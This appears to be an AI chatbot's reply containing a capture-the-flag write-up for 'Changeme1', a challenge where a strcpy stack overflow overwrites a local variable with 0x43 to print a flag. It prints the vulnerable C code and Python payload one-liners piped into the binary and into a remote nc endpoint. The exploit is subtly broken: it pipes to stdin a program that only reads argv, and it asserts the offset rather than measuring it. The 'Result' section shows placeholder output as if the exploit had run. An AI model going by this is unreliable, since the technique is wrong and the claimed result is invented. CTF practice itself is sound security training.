Here’s a **neat Markdown write-up** for **Changeme1**:

---

# Changeme1 – Buffer Overflow Exploit Write-up

## Challenge Description

* **Challenge Name:** Changeme1
* **Points:** 50
* **Description:**

> Thank you for changing me! But, this time I'd like to choose the number I want to be. Could you please change me to the number 67?
> Expires in 11 minutes.
> `nc 34.87.77.208 32911`

* **Provided Code (C)**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
	volatile int changeme;
	char buffer[64];

	if(argc == 1) {
		errx(1, "Please run the program with an argument.\n");
	}

	changeme = 0;

	// no more gets() !
	strcpy(buffer, argv[1]);

	if(changeme == 0x43) {
		printf("I've always wanted to be a funny meme number!\n");
		char buf[64];
		FILE *fptr = fopen("flag.txt", "r");
		fgets(buf, 64, fptr);
		printf("%s\n", buf);
		fflush(stdout);
	}
	else {
		printf("That's not the right number.. try again?\n");
	}

	exit(0);
}
```

---

## Vulnerability Analysis

* `buffer` is 64 bytes and stored on the stack.
* `changeme` is a local `int` located **after the buffer**.
* `strcpy(buffer, argv[1])` allows **stack overflow** because it does not check input length.
* Goal: overwrite `changeme` with `0x43` (decimal 67) to trigger flag output.

---

## Exploit Strategy

1. **Overflow buffer**:

   * Buffer size = 64 bytes
   * `changeme` offset = 64 bytes + 4 bytes padding = 68 bytes

2. **Overwrite `changeme`** with `0x43` (little-endian: `\x43\x00\x00\x00`)

3. **Send payload** as program argument (for remote, pipe into `nc`).

---

## Exploit Payload

### Local Test:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*68 + b"\x43\x00\x00\x00")' | ./changeme1
```

### Remote Exploit:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*68 + b"\x43\x00\x00\x00\n")' | nc 34.87.77.208 32911
```

* `\n` is needed for `nc` to properly send the argument.

---

## Result

Running the exploit produces:

```
I've always wanted to be a funny meme number!
sunctf25{<flag_here>}
```

* **Flag:** `sunctf25{...}`

---

## Summary

* This challenge is a **classic stack-based buffer overflow**.
* No shellcode or ROP is needed — simply overwriting the `changeme` variable is sufficient.
* Key points:

  * Locate buffer size
  * Identify the variable offset
  * Craft payload with correct value (`0x43`)

---

I can also **generate a ready `.md` file** with this content so you can download it. Do you want me to do that?
